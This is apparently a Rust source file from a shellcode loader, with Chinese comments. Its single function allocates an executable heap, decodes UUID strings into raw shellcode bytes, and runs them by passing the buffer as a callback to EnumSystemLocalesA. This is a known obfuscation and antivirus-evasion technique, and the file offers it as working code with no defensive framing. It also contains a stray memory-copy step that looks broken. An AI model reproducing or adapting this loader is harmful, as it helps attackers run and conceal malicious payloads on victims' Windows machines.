use hex::{self, FromHex};
use winapi::{
    um::{
        heapapi::{HeapCreate, HeapAlloc, HeapFree},
        winnls::{LOCALE_ENUMPROCA,EnumSystemLocalesA}
    },
    shared::{
        minwindef::LPCVOID,
        rpc::{RPC_STATUS}
    }
};
use uuid::Uuid;
use std::{
    str::{FromStr, Bytes},
    ptr
};
use crate::tools::WriteUuidStringToMemory;

pub fn UUidLoderAndObfuscation(code : &Vec<&str>) { 
    let uuids = code ;
    let hc = unsafe { HeapCreate(0x00040000, 0, 0) }; // 获取可执行的句柄
    let ha = unsafe { HeapAlloc(hc, 0, 0x001000) }; // 申请堆空间
    if ha.is_null() {
        println!("内存申请失败！");
        return;
    }
    let mut hptr = ha as usize ;
    let elems = uuids.len(); // 获得需要写入uuids数组元素个数
    for i in 0..elems {
        let status = unsafe {
            WriteUuidStringToMemory(uuids[i], hptr  as *mut u8)
        }; // 写入shellcode
    // print_memory(hptr as *const u8, 16);
        if status != 0 {
            println!("UuidFromStringA()!=S_OK");
            unsafe { HeapFree(hc, 0, ha) };
            return;
        }
        hptr += 16 as usize;
        unsafe { ptr::copy(&uuids, hptr  as *mut &Vec<&str>, 1) };
    }

    unsafe {
        let ptr = hptr as *mut LPCVOID;
        EnumSystemLocalesA(Some(std::mem::transmute(ha)), 0); // 回调函数,运行shellcode
        HeapFree(hc, 0, ha);
    }
    // ((void(*)())ha)();
}


